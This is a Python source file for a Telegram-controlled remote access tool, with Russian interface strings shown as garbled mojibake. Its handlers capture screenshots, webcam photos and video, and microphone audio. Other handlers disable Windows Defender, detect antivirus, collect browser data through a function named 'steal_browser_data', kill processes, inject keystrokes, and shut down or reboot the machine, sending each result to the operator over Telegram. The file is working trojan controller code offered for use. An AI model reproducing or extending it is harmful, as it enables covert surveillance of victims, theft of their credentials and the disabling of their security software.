import os
import time
import asyncio
import platform
from telegram import KeyboardButton, ReplyKeyboardMarkup
async def take_screenshot(user_id):
    if not modules.get('screenshot'):
        print("‚ùå –ú–æ–¥—É–ª—å screenshot –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å screenshot –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, "‚åõ –î–µ–ª–∞—é —Å–∫—Ä–∏–Ω—à–æ—Ç...")
        filename = modules['screenshot'].take_screenshot()
        if not filename:
            print("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç")
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç")
            return
            
        new_filename = utils.generate_temp_filename("png")
        os.rename(filename, new_filename)
        
        if await utils.send_screenshot(user_id, new_filename, message_id):
            print("‚úÖ –°–∫—Ä–∏–Ω—à–æ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω")
        else:
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {e}")

async def take_webcam_photo(user_id):
    if not modules.get('webcam'):
        print("‚ùå –ú–æ–¥—É–ª—å webcam –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å webcam –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, "‚åõ –î–µ–ª–∞—é —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã...")
        filename = modules['webcam'].capture_webcam_photo()
        if not filename:
            print("‚ùå –í–µ–±-–∫–∞–º–µ—Ä–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ –∏–ª–∏ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç")
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "‚ùå –í–µ–±-–∫–∞–º–µ—Ä–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ –∏–ª–∏ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç")
            return
            
        new_filename = utils.generate_temp_filename("jpg")
        os.rename(filename, new_filename)
        
        if await utils.send_screenshot(user_id, new_filename, message_id):
            print("‚úÖ –§–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ")
        else:
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –≤–µ–±-–∫–∞–º–µ—Ä—ã: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –≤–µ–±-–∫–∞–º–µ—Ä—ã: {e}")

async def record_video(user_id, seconds):
    if not modules.get('video'):
        print("‚ùå –ú–æ–¥—É–ª—å video –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å video –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, f"‚åõ –ó–∞–ø–∏—Å—ã–≤–∞—é –≤–∏–¥–µ–æ ({seconds} —Å–µ–∫)...")
        filename = modules['video'].record_video(seconds)
        if not filename:
            print("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ")
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ")
            return
            
        new_filename = utils.generate_temp_filename("mp4")
        os.rename(filename, new_filename)
        
        if await utils.send_video(user_id, new_filename, message_id):
            print("‚úÖ –í–∏–¥–µ–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ")
        else:
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤–∏–¥–µ–æ")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ: {e}")

async def record_webcam_video(user_id, seconds):
    if not modules.get('webcam'):
        print("‚ùå –ú–æ–¥—É–ª—å webcam –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å webcam –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, f"‚åõ –ó–∞–ø–∏—Å—ã–≤–∞—é –≤–∏–¥–µ–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã ({seconds} —Å–µ–∫)...")
        filename = modules['webcam'].record_webcam_video(seconds)
        if not filename:
            print("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã")
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã")
            return
            
        new_filename = utils.generate_temp_filename("mp4")
        os.rename(filename, new_filename)
        
        if await utils.send_video(user_id, new_filename, message_id):
            print("‚úÖ –í–∏–¥–µ–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ")
        else:
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤–∏–¥–µ–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ: {e}")

async def record_audio(user_id, seconds):
    if not modules.get('microphone'):
        print("‚ùå –ú–æ–¥—É–ª—å microphone –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å microphone –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, f"‚åõ –ó–∞–ø–∏—Å—ã–≤–∞—é –∞—É–¥–∏–æ ({seconds} —Å–µ–∫)...")
        filename = modules['microphone'].record_audio(seconds)
        if not filename:
            print("‚ùå –ú–∏–∫—Ä–æ—Ñ–æ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç")
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "‚ùå –ú–∏–∫—Ä–æ—Ñ–æ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç")
            return
            
        new_filename = utils.generate_temp_filename("ogg")
        os.rename(filename, new_filename)
        
        if await utils.send_voice(user_id, new_filename, message_id):
            print("‚úÖ –ê—É–¥–∏–æ–∑–∞–ø–∏—Å—å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞")
        else:
            await utils.delete_message(user_id, message_id)
            await utils.send_message(user_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∞—É–¥–∏–æ–∑–∞–ø–∏—Å—å")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –∞—É–¥–∏–æ: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –∞—É–¥–∏–æ: {e}")

async def display_message(user_id, title, text, style="info"):
    if not modules.get('messagebox'):
        print("‚ùå –ú–æ–¥—É–ª—å messagebox –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å messagebox –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, f"‚åõ –ü–æ–∫–∞–∑—ã–≤–∞—é —Å–æ–æ–±—â–µ–Ω–∏–µ: {title}")
        start_time = time.time()
        result = modules['messagebox'].display_message(title, text, style)
        execution_time = round(time.time() - start_time, 2)
        await utils.delete_message(user_id, message_id)
        if result:
            await utils.send_message(user_id, f"‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ '{title}' –ø–æ–∫–∞–∑–∞–Ω–æ –∑–∞ {execution_time} —Å–µ–∫")
        else:
            await utils.send_message(user_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–∫–∞–∑–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –ø–æ–∫–∞–∑–∞ —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –ø–æ–∫–∞–∑–∞ —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")

async def check_antivirus(user_id):
    if platform.system() != "Windows":
        print("‚ùå –ê–Ω—Ç–∏–≤–∏—Ä—É—Å –¥–æ—Å—Ç—É–ø–µ–Ω —Ç–æ–ª—å–∫–æ –Ω–∞ Windows")
        await utils.send_message(user_id, "‚ùå –ê–Ω—Ç–∏–≤–∏—Ä—É—Å –¥–æ—Å—Ç—É–ø–µ–Ω —Ç–æ–ª—å–∫–æ –Ω–∞ Windows")
        return
    if not modules.get('antivirus'):
        print("‚ùå –ú–æ–¥—É–ª—å antivirus –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å antivirus –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, "‚åõ –ü—Ä–æ–≤–µ—Ä—è—é –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã...")
        result = modules['antivirus'].detect_antivirus()
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, result if result else "üõ° –ê–Ω—Ç–∏–≤–∏—Ä—É—Å—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞: {e}")

async def disable_defender(user_id):
    if platform.system() != "Windows":
        print("‚ùå –û—Ç–∫–ª—é—á–µ–Ω–∏–µ Defender –¥–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –Ω–∞ Windows")
        await utils.send_message(user_id, "‚ùå –û—Ç–∫–ª—é—á–µ–Ω–∏–µ Defender –¥–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –Ω–∞ Windows")
        return
    if not modules.get('defender'):
        print("‚ùå –ú–æ–¥—É–ª—å defender –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å defender –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, "‚åõ –û—Ç–∫–ª—é—á–∞—é Windows Defender...")
        result = modules['defender'].disable_defender()
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, result)
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è Defender: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è Defender: {e}")

async def steal_browser_data(user_id):
    if not modules.get('browser'):
        print("‚ùå –ú–æ–¥—É–ª—å browser –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å browser –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, "‚åõ –°–æ–±–∏—Ä–∞—é –¥–∞–Ω–Ω—ã–µ –∏–∑ –±—Ä–∞—É–∑–µ—Ä–æ–≤...")
        result = modules['browser'].get_browser_data()
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, result)
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö –±—Ä–∞—É–∑–µ—Ä–æ–≤: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö –±—Ä–∞—É–∑–µ—Ä–æ–≤: {e}")

async def jiggle_mouse(user_id):
    if not modules.get('mouse'):
        print("‚ùå –ú–æ–¥—É–ª—å mouse –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å mouse –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, "‚åõ –î—ë—Ä–≥–∞—é –º—ã—à–∫—É...")
        result = modules['mouse'].jiggle()
        await utils.delete_message(user_id, message_id)
        if result:
            await utils.send_message(user_id, "üñ± –ú—ã—à—å –¥–µ—Ä–Ω—É—Ç–∞")
        else:
            await utils.send_message(user_id, "‚ùå –§—É–Ω–∫—Ü–∏—è –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –Ω–∞ Windows")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∫–∏: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∫–∏: {e}")

async def minimize_window(user_id):
    if not modules.get('minimize'):
        print("‚ùå –ú–æ–¥—É–ª—å minimize –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å minimize –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, "‚åõ –°–≤–æ—Ä–∞—á–∏–≤–∞—é –∞–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ...")
        result = modules['minimize'].minimize_active_window()
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, "‚úÖ –û–∫–Ω–æ —Å–≤—ë—Ä–Ω—É—Ç–æ" if result else "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–≤–µ—Ä–Ω—É—Ç—å –æ–∫–Ω–æ")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Å–≤–æ—Ä–∞—á–∏–≤–∞–Ω–∏—è –æ–∫–Ω–∞: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ —Å–≤–æ—Ä–∞—á–∏–≤–∞–Ω–∏—è –æ–∫–Ω–∞: {e}")

async def minimize_all_windows(user_id):
    if not modules.get('minimize'):
        print("‚ùå –ú–æ–¥—É–ª—å minimize –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å minimize –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, "‚åõ –°–≤–æ—Ä–∞—á–∏–≤–∞—é –≤—Å–µ –æ–∫–Ω–∞...")
        result = modules['minimize'].minimize_all_windows()
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, "‚úÖ –í—Å–µ –æ–∫–Ω–∞ —Å–≤—ë—Ä–Ω—É—Ç—ã" if result else "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–≤–µ—Ä–Ω—É—Ç—å –æ–∫–Ω–∞")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Å–≤–æ—Ä–∞—á–∏–≤–∞–Ω–∏—è –≤—Å–µ—Ö –æ–∫–æ–Ω: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ —Å–≤–æ—Ä–∞—á–∏–≤–∞–Ω–∏—è –≤—Å–µ—Ö –æ–∫–æ–Ω: {e}")

async def set_volume(user_id, mute=False):
    if platform.system() != "Windows":
        print("‚ùå –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∑–≤—É–∫–æ–º –¥–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –Ω–∞ Windows")
        await utils.send_message(user_id, "‚ùå –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∑–≤—É–∫–æ–º –¥–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –Ω–∞ Windows")
        return
    if not modules.get('sound'):
        print("‚ùå –ú–æ–¥—É–ª—å sound –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å sound –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, "‚åõ –í—ã–∫–ª—é—á–∞—é –∑–≤—É–∫..." if mute else "‚åõ –í–∫–ª—é—á–∞—é –∑–≤—É–∫...")
        result = modules['sound'].mute() if mute else modules['sound'].unmute()
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, "‚úÖ –ó–≤—É–∫ –∏–∑–º–µ–Ω—ë–Ω" if result else "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑–º–µ–Ω–∏—Ç—å –∑–≤—É–∫")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∑–≤—É–∫–æ–º: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∑–≤—É–∫–æ–º: {e}")

async def shutdown_pc(user_id):
    if not modules.get('power'):
        print("‚ùå –ú–æ–¥—É–ª—å power –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å power –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, "‚åõ –í—ã–∫–ª—é—á–∞—é –∫–æ–º–ø—å—é—Ç–µ—Ä...")
        result = modules['power'].shutdown()
        await utils.delete_message(user_id, message_id)
        if result:
            await utils.send_message(user_id, "üîå –ö–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–∞–µ—Ç—Å—è...")
        else:
            await utils.send_message(user_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–∫–ª—é—á–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –≤—ã–∫–ª—é—á–µ–Ω–∏—è: {e}")

async def reboot_pc(user_id):
    if not modules.get('power'):
        print("‚ùå –ú–æ–¥—É–ª—å power –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å power –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, "‚åõ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞—é –∫–æ–º–ø—å—é—Ç–µ—Ä...")
        result = modules['power'].reboot()
        await utils.delete_message(user_id, message_id)
        if result:
            await utils.send_message(user_id, "üîÑ –ö–æ–º–ø—å—é—Ç–µ—Ä –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è...")
        else:
            await utils.send_message(user_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–æ–º–ø—å—é—Ç–µ—Ä")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏: {e}")

async def terminate_active_process(user_id):
    if not modules.get('terminate'):
        print("‚ùå –ú–æ–¥—É–ª—å terminate –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å terminate –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, "‚åõ –ó–∞–≤–µ—Ä—à–∞—é –∞–∫—Ç–∏–≤–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å...")
        success, execution_time, active_window = modules['terminate'].terminate_active_process()
        await utils.delete_message(user_id, message_id)
        if success:
            await utils.send_message(user_id, f"‚úÖ –ü—Ä–æ—Ü–µ—Å—Å –æ–∫–Ω–∞ '{active_window}' –∑–∞–≤–µ—Ä—à–µ–Ω –∑–∞ {execution_time} —Å–µ–∫")
        else:
            await utils.send_message(user_id, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞: {e}")

async def terminate_process_by_name(user_id, process_name):
    if not modules.get('terminate_process'):
        print("‚ùå –ú–æ–¥—É–ª—å terminate_process –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª—å terminate_process –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω")
        return
    try:
        message_id = await utils.send_message(user_id, f"‚åõ –ó–∞–≤–µ—Ä—à–∞—é –ø—Ä–æ—Ü–µ—Å—Å {process_name}...")
        result = modules['terminate_process'].terminate_process_by_name(process_name)
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, result)
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ {process_name}: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ {process_name}: {e}")

async def press_key_combination(user_id, keys):
    if not modules.get('keyboard') and not modules.get('key_combination'):
        print("‚ùå –ú–æ–¥—É–ª–∏ keyboard –∏ key_combination –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω—ã")
        await utils.send_message(user_id, "‚ùå –ú–æ–¥—É–ª–∏ keyboard –∏ key_combination –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω—ã")
        return
    try:
        valid_keys = ['alt', 'ctrl', 'shift', 'win', 'tab', 'enter', 'space'] + [f'f{i}' for i in range(1, 13)] + list('abcdefghijklmnopqrstuvwxyz1234567890')
        keys_parts = [k.strip().lower() for k in keys.split('+')]
        for k in keys_parts:
            if k not in valid_keys:
                await utils.send_message(user_id, f"‚ùå –ù–µ–≤–µ—Ä–Ω–∞—è –∫–ª–∞–≤–∏—à–∞: {k}. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç 'alt + f4' –∏–ª–∏ 'ctrl + c'")
                return
                
        message_id = await utils.send_message(user_id, f"‚åõ –ù–∞–∂–∏–º–∞—é –∫–æ–º–±–∏–Ω–∞—Ü–∏—é {keys}...")
        if modules.get('keyboard'):
            result = modules['keyboard'].press_combination(keys)
        else:
            result = modules['key_combination'].press_key_combination(keys)
            
        await utils.delete_message(user_id, message_id)
        await utils.send_message(user_id, result)
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –Ω–∞–∂–∞—Ç–∏—è –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏ –∫–ª–∞–≤–∏—à {keys}: {e}")
        await utils.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –Ω–∞–∂–∞—Ç–∏—è –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏: {e}")

async def handle_text(update, context):
    user_id = update.message.from_user.id
    if user_id not in ALLOWED_USER_IDS:
        return
    text = update.message.text.strip()
    
    if text == "üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç":
        await take_screenshot(user_id)
    elif text == "üì∏ –§–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã":
        await take_webcam_photo(user_id)
    elif text == "üé• –°–¥–µ–ª–∞—Ç—å –≤–∏–¥–µ–æ":
        awaiting_duration[user_id] = "video"
        await utils.send_message(user_id, "üé• –í–≤–µ–¥–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤–∏–¥–µ–æ (5-30 —Å–µ–∫):")
    elif text == "üé• –í–∏–¥–µ–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã":
        awaiting_duration[user_id] = "webcam_video"
        await utils.send_message(user_id, "üé• –í–≤–µ–¥–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤–∏–¥–µ–æ (5-30 —Å–µ–∫):")
    elif text == "üéô –ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞":
        awaiting_duration[user_id] = "audio"
        await utils.send_message(user_id, "üéô –í–≤–µ–¥–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ (5-30 —Å–µ–∫):")
    elif text == "üí¨ –ù–∞–ø–∏—Å–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ":
        await utils.send_message(user_id, "üí¨ –í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø —Å–æ–æ–±—â–µ–Ω–∏—è:", reply_markup=utils.create_message_type_menu())
    elif text == "üì¢ –í—ã–∑–≤–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ":
        awaiting_messagebox[user_id] = "info"
        await utils.send_message(user_id, "üí¨ –í–≤–µ–¥–∏—Ç–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ —Å–æ–æ–±—â–µ–Ω–∏—è:")
    elif text == "‚ö†Ô∏è –í—ã–∑–≤–∞—Ç—å –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ":
        awaiting_messagebox[user_id] = "warning"
        await utils.send_message(user_id, "üí¨ –í–≤–µ–¥–∏—Ç–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è:")
    elif text == "‚ùå –í—ã–∑–≤–∞—Ç—å –æ—à–∏–±–∫—É":
        awaiting_messagebox[user_id] = "error"
        await utils.send_message(user_id, "üí¨ –í–≤–µ–¥–∏—Ç–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –æ—à–∏–±–∫–∏:")
    elif text == "üõ° –ê–Ω—Ç–∏–≤–∏—Ä—É—Å":
        await check_antivirus(user_id)
